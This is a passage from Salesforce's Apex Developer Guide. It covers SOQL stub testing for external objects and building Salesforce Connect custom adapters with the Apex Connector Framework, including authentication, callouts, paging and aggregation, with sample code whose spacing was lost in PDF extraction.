event.changeEventHeader= header;
event.put('ExternalId', 'ParentExternalId');
event.put('Price__c', 5500);
event.put('Name__c', 'Coat');
// Publishthe eventto the EventBus
EventBus.publish(event);
Test.getEventBus().deliver();
// Performassertionthatthe triggerwas run
Product_Audit__caudit= [SELECTname,Audit_Price__c,Product_Name__cFROM
Product_Audit__cWHEREname= : 'ProductChangeOn'+ event.ExternalIdLIMIT1];
System.assertEquals('ProductChangeOn'+ event.ExternalId,audit.Name);
System.assertEquals(5500,audit.Audit_Price__c);
System.assertEquals('Coat', audit.Product_Name__c);
}
}
Mock SOQL Tests for External Objects
You can mock SOQL query responses for external objects in Apex testing by using SOQL stub methods and a new test class. Use basic
and joined SOQL queries against external objects and return mock records in a testing context.
Create mock test classes by extending the new System.SoqlStubProvider class and overriding the handleSoqlQuery()
class method. Create external object records using either Test.createStubQueryRow() or
Test.createStubQueryRows(). Register the mock provider in the test using Test.createSoqlStub() and execute
the test code.
Note:  Apex governor limits apply to the stubbed records.
518
Using Salesforce Features with ApexApex Developer Guide

The SOQL query must be against an external object, either directly with a FROM clause or via a subquery. These features aren’t allowed
within a stub implementation.
•
SOQL
•
SOSL
•
Callouts
•
Future methods
•
Queueable Jobs
•
Batch Jobs
•
DML
•
Platform events
This example shows a mock test class for the GithubIssueTest class with joined and basic queries.
/**
*   Testclassthatutilizesthe SoqlStubProviderclasses.
*   Eachtestsetsthe appropriateSoqlStubProvider
*   and runsvalidationagainstthe mockedqueryresults.
**/
@isTest
publicclassGithubIssueTest{
@isTest
staticvoidtestGithubIssueQuery(){
QueryIssueUtilqueryIssueUtil= new QueryIssueUtil();
SObjectTypetype= queryIssueUtil.getSObjectTypeForDynamicSoql('GithubIssues__x');
Test.createSoqlStub(type,new IssueStubProvider());
Test.startTest();
Assert.isTrue(Test.isSoqlStubDefined(type));
Assert.isTrue(queryIssueUtil.queryGithubIssuesAndCheckForId());
Assert.areEqual(Limits.getQueries(),1);
Assert.areEqual(Limits.getQueryRows(),1);
Assert.areEqual(Limits.getAggregateQueries(),0);
Assert.isTrue(queryIssueUtil.queryGithubIssuesAndVerifyResultSize(1));
Assert.areEqual(Limits.getQueries(),2);
Assert.areEqual(Limits.getQueryRows(),2);
Assert.areEqual(Limits.getAggregateQueries(),0);
Test.stopTest();
}
@isTest
staticvoidtestIssueToCommentJoinQuery(){
QueryIssueUtilqueryIssueUtil= new QueryIssueUtil();
Test.createSoqlStub(GithubIssues__x.SObjectType,new IssueCommentJoinStubProvider());
Test.startTest();
Assert.isTrue(Test.isSoqlStubDefined(GithubIssues__x.SObjectType));
Assert.isTrue(queryIssueUtil.queryIssueToCommentJoinAndCheckForCommentId());
Assert.areEqual(Limits.getQueries(),1);
Assert.areEqual(Limits.getQueryRows(),3);
Assert.areEqual(Limits.getAggregateQueries(),1);
Assert.isTrue(queryIssueUtil.queryIssueToCommentJoinAndVerifyResultSize(1,2));
519
Using Salesforce Features with ApexApex Developer Guide

Assert.areEqual(Limits.getQueries(),2);
Assert.areEqual(Limits.getQueryRows(),6);
Assert.areEqual(Limits.getAggregateQueries(),2);
Test.stopTest();
}
}
/**
*   SoqlStubProviderclassthatreturnsa mockedqueryresult
*   for joinedqueriesbetweenthe GithubIssuesobjectand
*   the associatedCommentsobject.
**/
publicclassIssueCommentJoinStubProviderextendsSoqlStubProvider{
publicoverrideList<SObject>handleSoqlQuery(SObjectTypesobjectType,StringrawQuery,
Map<String,Object> binds){
if (sobjectType.equals(GithubIssues__x.SObjectType)){
Assert.areEqual(binds.size(),0);
List<GithubIssues__x>issues= new List<GithubIssues__x>();
List<Map<String,Object>> commentMaps= new List<Map<String,Object>>();
Map<String, Object> comment1= new Map<String, Object> {
'Id'=> 'x09xx000000brk9AAA'
};
Map<String, Object> comment2= new Map<String, Object> {
'Id'=> 'x09xx000001brk9AAA'
};
commentMaps.add(comment1);
commentMaps.add(comment2);
List<IssueComments__x>comments= (List<IssueComments__x>)
Test.createStubQueryRows(IssueComments__x.SObjectType,commentMaps);
Map<String, Object> issueMap= new Map<String, Object> {
'Id'=> 'x08xx000002HNZ6AAO',
'Title__c'=> 'SampleIssue1',
'IssueComments__r'=> comments
};
GithubIssues__xobj = (GithubIssues__x)Test.createStubQueryRow(sobjectType,
issueMap);
issues.add(obj);
returnissues;
}
returnnull;
}
}
/**
*   SoqlStubProviderclassthatreturnsa mockedqueryresult
*   for queriesagainstthe GithubIssuesobject.
520
Using Salesforce Features with ApexApex Developer Guide

**/
publicclassIssueStubProviderextendsSoqlStubProvider{
publicoverrideList<SObject>handleSoqlQuery(SObjectTypesobjectType,StringrawQuery,
Map<String,Object> binds){
if (sobjectType.equals(GithubIssues__x.SObjectType)){
Assert.areEqual(binds.size(),1);
Assert.areEqual(binds.get('tmpVar1'), 'x08xx000002HNZ6AAO');
List<SObject>objs= new List<SObject>();
Map<String, Object> individualMap= new Map<String, Object> {
'Id'=> 'x08xx000002HNZ6AAO'
};
GithubIssues__xobj = (GithubIssues__x)Test.createStubQueryRow(sobjectType,
individualMap);
objs.add(obj);
returnobjs;
}
returnnull;
}
}
/**
*   Utilityclassthatrunsqueriesto be mocked
*   in the Apextests.
**/
publicclassQueryIssueUtil{
publicbooleanqueryGithubIssuesAndCheckForId(){
// BINDSWITHUSER_MODEDYNAMICQUERY
Map<String, Object> binds= new Map<String, Object>{'tmpVar1'=>
'x08xx000002HNZ6AAO'};
List<GithubIssues__x>issues= Database.queryWithBinds('SELECTId FROM
GithubIssues__xWHEREId  = :tmpVar1', binds,AccessLevel.USER_MODE);
for (GithubIssues__xissue: issues) {
if (issue.Id.equals('x08xx000002HNZ6AAO')) {
returntrue;
}
}
returnfalse;
}
publicbooleanqueryGithubIssuesAndVerifyResultSize(Integersize){
// BINDSWITHSYSTEM_MODESTATICQUERY
StringissueId= 'x08xx000002HNZ6AAO';
List<GithubIssues__x>issues= [SELECTId FROMGithubIssues__xWHEREId  = :issueId];
if(issues.size()== size){
returntrue;
}
returnfalse;
}
521
Using Salesforce Features with ApexApex Developer Guide

publicbooleanqueryIssueToCommentJoinAndCheckForCommentId(){
// DYNAMICQUERY
List<GithubIssues__x>issues= Database.query('SELECTId, Title__c,(SELECTId
FROMIssueComments__r)FROMGithubIssues__xWHEREId = \'003000000000000\'');
for (GithubIssues__xissue: issues){
List<IssueComments__x>comments= issue.IssueComments__r;
System.debug(comments);
if(!comments.get(0).Id.equals('x09xx000000brk9AAA') &&
!comments.get(1).Id.equals('x09xx000001brk9AAA'))returnfalse;
}
returntrue;
}
publicbooleanqueryIssueToCommentJoinAndVerifyResultSize(IntegerparentSize,Integer
childSize){
// STATICQUERY
List<GithubIssues__x>issues= [SELECTId, Title__c,(SELECTId FROM
IssueComments__r)FROMGithubIssues__xWHEREId = '003000000000000'];
if(issues.size()== parentSize&& issues.get(0).IssueComments__r.size()== childSize)
{
returntrue;
}
returnfalse;
}
publicSObjectTypegetSObjectTypeForDynamicSoql(Stringname){
Schema.DescribeSObjectResult[]descResult= Schema.describeSobjects(new
List<String>{name});
SObjectTypetype= descResult.get(0).getSobjectType();
returntype;
}
}
Get Started with the Apex Connector Framework
To get started with your first custom adapter for Salesforce Connect, create two Apex classes: one that extends the
DataSource.Connection class, and one that extends the DataSource.Provider class.
Note:  The DataSource.Connection class requires a Salesforce Connect add-on license. For more information, see
Salesforce Connect Adapters Included per Add-On License.
Let’s step through the code of a sample custom adapter.
1.Create a Sample DataSource.Connection Class
First, create a DataSource.Connection class to enable Salesforce to obtain the external system’s schema and to handle
queries and searches of the external data.
2.Create a Sample DataSource.Provider Class
Now you need a class that extends and overrides a few methods in DataSource.Provider.
522
Using Salesforce Features with ApexApex Developer Guide

3.Set Up Salesforce Connect to Use Your Custom Adapter
After you create your DataSource.Connection and DataSource.Provider classes, the Salesforce Connect custom
adapter becomes available in Setup.
Create a Sample DataSource.Connection Class
First, create a DataSource.Connection class to enable Salesforce to obtain the external system’s schema and to handle queries
and searches of the external data.
globalclassSampleDataSourceConnection
extendsDataSource.Connection{
globalSampleDataSourceConnection(DataSource.ConnectionParams
connectionParams){
}
// Add implementationof abstractmethods
// ...
The DataSource.Connection class contains these methods.
•
query
•
search
•
sync
•
upsertRows
•
deleteRows
sync
The sync() method is invoked when an administrator clicks the Validate and Sync button on the external data source detail page.
It returns information that describes the structural metadata on the external system.
Note:  Changing the sync method on the DataSource.Connection class doesn’t automatically resync any external
objects.
// ...
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
columns.add(DataSource.Column.text('Name', 255));
columns.add(DataSource.Column.text('ExternalId', 255));
columns.add(DataSource.Column.url('DisplayUrl'));
tables.add(DataSource.Table.get('Sample', 'Title',
columns));
returntables;
}
// ...
query
The query method is invoked when a SOQL query is executed on an external object. A SOQL query is automatically generated and
executed when a user opens an external object’s list view or detail page in Salesforce. The DataSource.QueryContext is always
only for a single table.
523
Using Salesforce Features with ApexApex Developer Guide

This sample custom adapter uses a helper method in the DataSource.QueryUtils class to filter and sort the results based on
the WHERE and ORDERBY clauses in the SOQL query.
The DataSource.QueryUtils class and its helper methods can process query results locally within your Salesforce org. This class
is provided for your convenience to simplify the development of your Salesforce Connect custom adapter for initial tests. However, the
DataSource.QueryUtils class and its methods aren’t supported for use in production environments that use callouts to retrieve
data from external systems. Complete the filtering and sorting on the external system before sending the query results to Salesforce.
When possible, use server-driven paging or another technique to have the external system determine the appropriate data subsets
according to the limit and offset clauses in the query.
// ...
overrideglobalDataSource.TableResultquery(
DataSource.QueryContextcontext){
if (context.tableSelection.columnsSelected.size()== 1 &&
context.tableSelection.columnsSelected.get(0).aggregation==
DataSource.QueryAggregation.COUNT){
List<Map<String,Object>> rows= getRows(context);
List<Map<String,Object>> response=
DataSource.QueryUtils.filter(context,getRows(context));
List<Map<String, Object>> countResponse=
new List<Map<String, Object>>();
Map<String, Object> countRow=
new Map<String, Object>();
countRow.put(
context.tableSelection.columnsSelected.get(0).columnName,
response.size());
countResponse.add(countRow);
returnDataSource.TableResult.get(context,
countResponse);
} else{
List<Map<String,Object>> filteredRows=
DataSource.QueryUtils.filter(context,getRows(context));
List<Map<String,Object>> sortedRows=
DataSource.QueryUtils.sort(context,filteredRows);
List<Map<String,Object>> limitedRows=
DataSource.QueryUtils.applyLimitAndOffset(context,
sortedRows);
returnDataSource.TableResult.get(context,limitedRows);
}
}
// ...
search
The search method is invoked by a SOSL query of an external object or when a user performs a Salesforce global search that also
searches external objects. Because search can be federated over multiple objects, the DataSource.SearchContext can have
multiple tables selected. In this example, however, the custom adapter knows about only one table.
// ...
overrideglobalList<DataSource.TableResult>search(
DataSource.SearchContextcontext){
List<DataSource.TableResult>results=
new List<DataSource.TableResult>();
for (DataSource.TableSelectiontableSelection:
524
Using Salesforce Features with ApexApex Developer Guide

context.tableSelections){
results.add(DataSource.TableResult.get(tableSelection,
getRows(context)));
}
returnresults;
}
// ...
The following is the getRows helper method that the search sample calls to get row values from the external system. The getRows
method makes use of other helper methods:
•
makeGetCallout makes a callout to the external system.
•
foundRow populates a row based on values from the callout result. The foundRow method is used to make any modifications
to the returned field values, such as changing a field name or modifying a field value.
These methods aren’t included in this snippet but are available in the full example included in Connection Class. Typically, the filter from
SearchContext or QueryContext would be used to reduce the result set, but for simplicity this example doesn’t make use of
the context object.
// ...
// Helpermethodto get recordvaluesfromthe externalsystemfor the Sampletable.
privateList<Map<String, Object>> getRows() {
// Get row fieldvaluesfor the Sampletablefromthe externalsystemvia a callout.
HttpResponseresponse= makeGetCallout();
// Parsethe JSONresponseand populatethe rows.
Map<String, Object> m = (Map<String, Object>)JSON.deserializeUntyped(
response.getBody());
Map<String, Object> error= (Map<String, Object>)m.get('error');
if (error!= null) {
throwException(string.valueOf(error.get('message')));
}
List<Map<String,Object>> rows= new List<Map<String,Object>>();
List<Object> jsonRows= (List<Object>)m.get('value');
if (jsonRows== null) {
rows.add(foundRow(m));
} else{
for (ObjectjsonRow: jsonRows){
Map<String,Object> row = (Map<String,Object>)jsonRow;
rows.add(foundRow(row));
}
}
returnrows;
}
// ...
upsertRows
The upsertRows method is invoked when external object records are created or updated. You can create or update external object
records through the Salesforce user interface or DML. The following example provides a sample implementation for the upsertRows
method. The example uses the passed-in UpsertContext to determine what table was selected and performs the upsert only if
the name of the selected table is Sample. The upsert operation is broken up into either an insert of a new record or an update of an
existing record. These operations are performed in the external system using callouts. An array of DataSource.UpsertResult
525
Using Salesforce Features with ApexApex Developer Guide

is populated from the results obtained from the callout responses. Note that because a callout is made for each row, this example might
hit the Apex callouts limit.
// ...
globaloverrideList<DataSource.UpsertResult>upsertRows(DataSource.UpsertContext
context){
if (context.tableSelected== 'Sample') {
List<DataSource.UpsertResult>results= new List<DataSource.UpsertResult>();
List<Map<String, Object>> rows= context.rows;
for (Map<String, Object> row : rows){
// Makea calloutto insertor updaterecordsin the externalsystem.
HttpResponseresponse;
// Determinewhetherto insertor updatea record.
if (row.get('ExternalId') == null){
// Senda POSTHTTPrequestto insertnew externalrecord.
// Makean Apexcalloutand get HttpResponse.
response= makePostCallout(
'{"name":"'+ row.get('Name') + '","ExternalId":"'+
row.get('ExternalId') + '"');
}
else{
// Senda PUT HTTPrequestto updatean existingexternalrecord.
// Makean Apexcalloutand get HttpResponse.
response= makePutCallout(
'{"name":"'+ row.get('Name') + '","ExternalId":"'+
row.get('ExternalId') + '"',
String.valueOf(row.get('ExternalId')));
}
// Checkthe returnedresponse.
// Deserializethe response.
Map<String, Object> m = (Map<String, Object>)JSON.deserializeUntyped(
response.getBody());
if (response.getStatusCode()== 200){
results.add(DataSource.UpsertResult.success(
String.valueOf(m.get('id'))));
}
else{
results.add(DataSource.UpsertResult.failure(
String.valueOf(m.get('id')),
'Thecalloutresultedin an error:' +
response.getStatusCode()));
}
}
returnresults;
}
returnnull;
}
// ...
526
Using Salesforce Features with ApexApex Developer Guide

deleteRows
The deleteRows method is invoked when external object records are deleted. You can delete external object records through the
Salesforce user interface or DML. The following example provides a sample implementation for the deleteRows method. The example
uses the passed-in DeleteContext to determine what table was selected and performs the deletion only if the name of the selected
table is Sample. The deletion is performed in the external system using callouts for each external ID. An array of
DataSource.DeleteResult is populated from the results obtained from the callout responses. Note that because a callout is
made for each ID, this example might hit the Apex callouts limit.
// ...
globaloverrideList<DataSource.DeleteResult>deleteRows(DataSource.DeleteContext
context){
if (context.tableSelected== 'Sample'){
List<DataSource.DeleteResult>results= new List<DataSource.DeleteResult>();
for (StringexternalId: context.externalIds){
HttpResponseresponse= makeDeleteCallout(externalId);
if (response.getStatusCode()== 200){
results.add(DataSource.DeleteResult.success(externalId));
}
else{
results.add(DataSource.DeleteResult.failure(externalId,
'Calloutdeleteerror:'
+ response.getBody()));
}
}
returnresults;
}
returnnull;
}
// ...
SEE ALSO:
Execution Governors and Limits
Apex Reference Guide: Connection Class
Filters in the Apex Connector Framework
Create a Sample DataSource.Provider Class
Now you need a class that extends and overrides a few methods in DataSource.Provider.
Your DataSource.Provider class informs Salesforce of the authentication and functional capabilities that are supported by or
required to connect to the external system.
globalclassSampleDataSourceProviderextendsDataSource.Provider{
If the external system requires authentication, Salesforce can provide the authentication credentials from the external data source
definition or users’ personal settings. This example specifies that the external system doesn’t require authentication, but also supports
OAuth authentication. To do so, it returns AuthenticationCapability.ANONYMOUS and
AuthenticationCapability.OAUTH in the list of authentication capabilities.
527
Using Salesforce Features with ApexApex Developer Guide

The getAuthenticationCapabilities method should always return the same list of authentication types regardless of user,
org, or context.
globaloverrideList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
// BestPractice:Alwaysreturna staticlistof authenticationtypes
// Don'tquerythe database,makecallouts,or use dynamiclogic
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
capabilities.add(DataSource.AuthenticationCapability.ANONYMOUS);
capabilities.add(DataSource.AuthenticationCapability.OAUTH);
returncapabilities;
}
This example also specifies that the external system allows SOQL queries, SOSL queries, Salesforce searches, upserting data, and deleting
data.
•
To allow SOQL, the example declares the DataSource.Capability.ROW_QUERY capability.
•
To allow SOSL and Salesforce searches, the example declares the DataSource.Capability.SEARCH capability.
•
To allow upserting external data, the example declares the DataSource.Capability.ROW_CREATE and
DataSource.Capability.ROW_UPDATE capabilities.
•
To allow deleting external data, the example declares the DataSource.Capability.ROW_DELETE capability.
The getCapabilities method should always return the same list of capabilities regardless of configuration or data.The returned
capabilities should never change based on runtime conditions, user context, dynamic queries, or any other conditions.
globaloverrideList<DataSource.Capability>getCapabilities(){
// BestPractice:Returna staticlistof functionalcapabilities
// Don'tquerythe database,makecallouts,or use dynamiclogic
List<DataSource.Capability>capabilities= new
List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
capabilities.add(DataSource.Capability.SEARCH);
capabilities.add(DataSource.Capability.ROW_CREATE);
capabilities.add(DataSource.Capability.ROW_UPDATE);
capabilities.add(DataSource.Capability.ROW_DELETE);
returncapabilities;
}
Warning:  When you call the getAuthenticationCapabilities or getCapabilities methods, be sure the
returned list always contains the same values. Never use a SOQL query, callout, or any conditional logic that changes the returned
values based on runtime conditions. Returning varying lists of authentication capabilities or capabilities for an external system can
lead to errors that are difficult to troubleshoot.
Lastly, the example identifies the SampleDataSourceConnection class that obtains the external system’s schema and handles
the queries and searches of the external data.
globaloverrideDataSource.ConnectiongetConnection(
DataSource.ConnectionParamsconnectionParams){
returnnew SampleDataSourceConnection(connectionParams);
528
Using Salesforce Features with ApexApex Developer Guide

}
}
SEE ALSO:
Apex Reference Guide: Provider Class
Set Up Salesforce Connect to Use Your Custom Adapter
After you create your DataSource.Connection and DataSource.Provider classes, the Salesforce Connect custom
adapter becomes available in Setup.
Complete the tasks that are described in “Set Up Salesforce Connect to Access External Data with a Custom Adapter” in the Salesforce
Help.
To add write capability for external objects to your adapter:
1.Make the external data source for this adapter writable. See “Define an External Data Source for Salesforce Connect—Custom Adapter”
in the Salesforce Help.
2.Implement the DataSource.Connection.upsertRows() and DataSource.Connection.deleteRows()
methods for the adapter. For details, see Connection Class.
Key Concepts About the Apex Connector Framework
The DataSource namespace provides the classes for the Apex Connector Framework. Use the Apex Connector Framework to develop
a custom adapter for Salesforce Connect. Then connect your Salesforce org to any data anywhere via the Salesforce Connect custom
adapter.
We recommend that you learn about some key concepts to help you use the Apex Connector Framework effectively.
External IDs for Salesforce Connect External Objects
When you access external data with a custom adapter for Salesforce Connect, the values of the External ID standard field on an
external object come from the DataSource.Column named ExternalId.
Authentication for Salesforce Connect Custom Adapters
Your DataSource.Provider class declares what types of credentials can be used to authenticate to the external system.
Callouts for Salesforce Connect Custom Adapters
Just like any other Apex code, a Salesforce Connect custom adapter can make callouts. If the connection to the external system
requires authentication, incorporate the authentication parameters into the callout.
Paging with the Apex Connector Framework
When displaying a large set of records in the user interface, Salesforce breaks the set into batches and displays one batch. You can
then page through those batches. However, custom adapters for Salesforce Connect don’t automatically support paging of any
kind. To support paging through external object data that’s obtained by a custom adapter, implement server-driven or client-driven
paging.
queryMore with the Apex Connector Framework
Custom adapters for Salesforce Connect don’t automatically support the queryMore method in API queries. However, your
implementation must be able to break up large result sets into batches and iterate over them by using the queryMore method
in the SOAP API. The default batch size is 500 records, but the query developer can adjust that value programmatically in the query
call.
529
Using Salesforce Features with ApexApex Developer Guide

Aggregation for Salesforce Connect Custom Adapters
If you receive a COUNT() query, the selected column has the value QueryAggregation.COUNT in its aggregation
property. The selected column is provided in the columnsSelected property on the tableSelection for the
DataSource.QueryContext.
Filters in the Apex Connector Framework
The DataSource.QueryContext contains one DataSource.TableSelection. The
DataSource.SearchContext can have more than one TableSelection. Each TableSelection has a filter
property that represents the WHERE clause in a SOQL or SOSL query.
External IDs for Salesforce Connect External Objects
When you access external data with a custom adapter for Salesforce Connect, the values of the External ID standard field on an external
object come from the DataSource.Column named ExternalId.
Each external object has an ExternalID standard field. Its values uniquely identify each external object record in your org. When
the external object is the parent in an external lookup relationship, the External ID standard field is used to identify the child records.
Important:
•
The custom adapter’s Apex code must declare the DataSource.Column named ExternalId and provide its values.
•
Don’t use sensitive data as the values of the External ID standard field or fields designated as name fields, because Salesforce
sometimes stores those values.
–
External lookup relationship fields on child records store and display the External ID values of the parent records.
–
For internal use only, Salesforce stores the External ID value of each row that’s retrieved from the external system.This
behavior doesn’t apply to external objects that are associated with high-data-volume external data sources.
Example:  This excerpt from a sample DataSource.Connection class shows the DataSource.Column named
ExternalId.
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
columns.add(DataSource.Column.text('title', 255));
columns.add(DataSource.Column.text('description',255));
columns.add(DataSource.Column.text('createdDate',255));
columns.add(DataSource.Column.text('modifiedDate',255));
columns.add(DataSource.Column.url('selfLink'));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('ExternalId',255));
tables.add(DataSource.Table.get('googleDrive','title',
columns));
returntables;
}
SEE ALSO:
Apex Reference Guide: Column Class
530
Using Salesforce Features with ApexApex Developer Guide

Authentication for Salesforce Connect Custom Adapters
Your DataSource.Provider class declares what types of credentials can be used to authenticate to the external system.
If your extension of the DataSource.Provider class returns DataSource.AuthenticationCapability values that
indicate support for authentication, the DataSource.Connection class is instantiated with a
DataSource.ConnectionParams instance in the constructor.
The authentication credentials in the DataSource.ConnectionParams instance depend on the IdentityType field of
the external data source definition in Salesforce.
•
If IdentityType is set to NamedPrincipal, the credentials come from the external data source definition.
•
If IdentityType is set to Per User:
–
For queries and searches, the credentials are specific to the current user who invokes the query or search. The credentials come
from the user’s authentication settings for the external system.
–
For administrative connections, such as syncing the external system’s schema, the credentials come from the external data
source definition.
OAuth for Salesforce Connect Custom Adapters
If you use OAuth 2.0 to access external data, learn how to avoid access interruptions caused by expired access tokens.
SEE ALSO:
OAuth for Salesforce Connect Custom Adapters
OAuth for Salesforce Connect Custom Adapters
If you use OAuth 2.0 to access external data, learn how to avoid access interruptions caused by expired access tokens.
Some external systems use OAuth access tokens that expire and need to be refreshed. We can automatically refresh access tokens as
needed when:
•
The user or external data source has a valid refresh token from a previous OAuth flow.
•
The sync, query, or search method in your DataSource.Connection class throws a
DataSource.OAuthTokenExpiredException.
We use the relevant OAuth credentials for the user or external data source to negotiate with the remote service and refresh the token.
The DataSource.Connection class is reconstructed with the new OAuth token in the DataSource.ConnectionParams
that we supply to the constructor. The search or query is then reinvoked.
If the authentication provider doesn’t provide a refresh token, access to the external system is lost when the current access token expires.
If a warning message appears on the external data source detail page, consult your OAuth provider for information about requesting
offline access or a refresh token.
For some authentication providers, requesting offline access is as simple as adding a scope. For example, to request offline access from
a Salesforce authentication provider, add refresh_token to the DefaultScopes field on the authentication provider definition
in your Salesforce organization.
For other authentication providers, you must request offline access in the authentication URL as a query parameter. For example, with
Google, append ?access_type=offline to the AuthorizeEndpointURL field on the authentication provider definition
531
Using Salesforce Features with ApexApex Developer Guide

in your Salesforce organization. To edit the authorization endpoint, select Open ID Connect in the ProviderType field of the
authentication provider. For details, see “Configure an OpenID Connect Authentication Provider” in the Salesforce Help.
SEE ALSO:
Authentication for Salesforce Connect Custom Adapters
Callouts for Salesforce Connect Custom Adapters
Just like any other Apex code, a Salesforce Connect custom adapter can make callouts. If the connection to the external system requires
authentication, incorporate the authentication parameters into the callout.
Authentication parameters are encapsulated in a ConnectionParams object and provided to your DataSource.Connection
class’s constructor.
For example, if your connection requires an OAuth access token, use code similar to the following.
publicHttpResponsegetResponse(Stringurl){
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
request.setHeader('Authorization', 'Bearer' +
this.connectionInfo.oauthToken);
HttpResponseresponse= httpProtocol.send(request);
returnresponse;
}
If your connection requires basic password authentication, use code similar to the following.
publicHttpResponsegetResponse(Stringurl){
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
stringencodedHeaderValue= EncodingUtil.base64Encode(Blob.valueOf(
this.connectioninfo.username+ ':' +
this.connectionInfo.password));
request.setHeader('Authorization', 'Basic' + encodedHeaderValue);
HttpResponseresponse= httpProtocol.send(request);
returnresponse;
}
Named Credentials as Callout Endpoints for Salesforce Connect Custom Adapters
A Salesforce Connect custom adapter obtains the relevant credentials that are stored in Salesforce whenever they’re needed. However,
your Apex code must apply those credentials to all callouts, except those that specify named credentials as the callout endpoints. A
named credential lets Salesforce handle the authentication logic for you so that your code doesn’t have to.
532
Using Salesforce Features with ApexApex Developer Guide

If all your custom adapter’s callouts use named credentials, you can set the external data source’s AuthenticationProtocol
field to No Authentication. The named credentials add the appropriate certificates and can add standard authorization headers to the
callouts. You also don’t need to define a remote site for an Apex callout endpoint that’s defined as a named credential.
SEE ALSO:
Named Credentials as Callout Endpoints
Paging with the Apex Connector Framework
When displaying a large set of records in the user interface, Salesforce breaks the set into batches and displays one batch. You can then
page through those batches. However, custom adapters for Salesforce Connect don’t automatically support paging of any kind. To
support paging through external object data that’s obtained by a custom adapter, implement server-driven or client-driven paging.
With server-driven paging, the external system controls the paging and ignores any batch boundaries or page sizes that are specified
in queries. To enable server-driven paging, declare the QUERY_PAGINATION_SERVER_DRIVEN capability in your
DataSource.Provider class. Also, your Apex code must generate a query token and use it to determine and fetch the next batch
of results.
With client-driven paging, you use LIMIT and OFFSET clauses to page through result sets. Factor in the offset and maxResults
properties in the DataSource.QueryContext to determine which rows to return. For example, suppose that the result set has
20 rows with numeric ExternalID values from 1 to 20. If we ask for an offset of 5 and maxResults of 5, we expect to get
the rows with IDs 6–10. We recommend that you do all filtering in the external system, outside of Apex, using methods that the external
system supports.
SEE ALSO:
Apex Reference Guide: QueryContext Class
queryMore with the Apex Connector Framework
Custom adapters for Salesforce Connect don’t automatically support the queryMore method in API queries. However, your
implementation must be able to break up large result sets into batches and iterate over them by using the queryMore method in
the SOAP API. The default batch size is 500 records, but the query developer can adjust that value programmatically in the query call.
To support queryMore, your implementation must indicate whether more data exists than what’s in the current batch. When the
Lightning Platform knows that more data exists, your API queries return a QueryResult object that’s similar to the following.
{
"totalSize"=> -1,
"done"=> false,
"nextRecordsUrl"=> "/services/data/v32.0/query/01gxx000000B5OgAAK-2000",
"records"=> [
[   0] {
"attributes"=> {
"type"=> "Sample__x",
"url"=>
"/services/data/v32.0/sobjects/Sample__x/x06xx0000000001AAA"
},
"ExternalId"=> "id0"
},
[   1] {
"attributes"=> {
"type"=> "Sample__x",
533
Using Salesforce Features with ApexApex Developer Guide

"url"=>
"/services/data/v32.0/sobjects/Sample__x/x06xx0000000002AAA"
},
...
}
Support queryMore by Using Server-Driven Paging
With server-driven paging, the external system controls the paging and ignores any batch boundaries or page sizes that are specified
in queries. To enable server-driven paging, declare the QUERY_PAGINATION_SERVER_DRIVEN capability in your
DataSource.Provider class.
Support queryMore by Using Client-Driven Paging
With client-driven paging, you use LIMIT and OFFSET clauses to page through result sets.
Support queryMore by Using Server-Driven Paging
With server-driven paging, the external system controls the paging and ignores any batch boundaries or page sizes that are specified
in queries. To enable server-driven paging, declare the QUERY_PAGINATION_SERVER_DRIVEN capability in your
DataSource.Provider class.
When the returned DataSource.TableResult doesn’t contain the entire result set, the TableResult must provide a
queryMoreToken value. The query token is an arbitrary string that we store temporarily. When we request the next batch of results,
we pass the query token back to your custom adapter in the DataSource.QueryContext. Your Apex code must use that query
token to determine which rows belong to the next batch of results.
When your custom adapter returns the final batch, it must not return a queryMoreToken value in the TableResult.
The Apex Connector Framework doesn't support server-driven pagination for list views.
SEE ALSO:
queryMore with the Apex Connector Framework
Support queryMore by Using Client-Driven Paging
With client-driven paging, you use LIMIT and OFFSET clauses to page through result sets.
If the external system can return the total size of the result set for each query, declare the QUERY_TOTAL_SIZE capability in your
DataSource.Provider class. Make sure that each search or query returns the totalSize value in the
DataSource.TableResult. If the total size is larger than the number of rows that are returned in the batch, we generate a
nextRecordsUrl link and set the done flag to false. We also set the totalSize in the TableResult to the value that
you supply.
If the external system can’t return the total size for each query, don’t declare the QUERY_TOTAL_SIZE capability in your
DataSource.Provider class. Whenever we do a query through your custom adapter, we ask for one extra row. For example, if
you run the query SELECTExternalIdFROMSampleLIMIT5, we call the query method on the
DataSource.Connection object with a DataSource.QueryContext that has the maxResults property set to 6.
The presence or absence of that sixth row in the result set indicates whether more data is available. We assume, however, that the data
set we query against doesn’t change between queries. If the data set changes between queries, you might see repeated rows or not
get all results.
534
Using Salesforce Features with ApexApex Developer Guide

Ultimately, accessing external data works most efficiently when you retrieve small amounts of data and the data set that you query
against changes infrequently.
SEE ALSO:
queryMore with the Apex Connector Framework
Aggregation for Salesforce Connect Custom Adapters
If you receive a COUNT() query, the selected column has the value QueryAggregation.COUNT in its aggregation property.
The selected column is provided in the columnsSelected property on the tableSelection for the
DataSource.QueryContext.
The following example illustrates how to apply the value of the aggregation property to handle COUNT() queries.
// HandleCOUNT()queries
if (context.tableSelection.columnsSelected.size()== 1 &&
context.tableSelection.columnsSelected.get(0).aggregation==
QueryAggregation.COUNT){
List<Map<String, Object>> countResponse= new List<Map<String, Object>>();
Map<String, Object> countRow= new Map<String, Object>();
countRow.put(context.tableSelection.columnsSelected.get(0).columnName,
response.size());
countResponse.add(countRow);
returncountResponse;
}
An aggregate query can still have filters, so your query method can be implemented like the following example to support basic
aggregation queries, with or without filters.
overrideglobalDataSource.TableResultquery(DataSource.QueryContextcontext){
List<Map<String,Object>> rows= retrieveData(context);
List<Map<String,Object>> response= postFilterRecords(
context.tableSelection.filter,rows);
if (context.tableSelection.columnsSelected.size()== 1 &&
context.tableSelection.columnsSelected.get(0).aggregation==
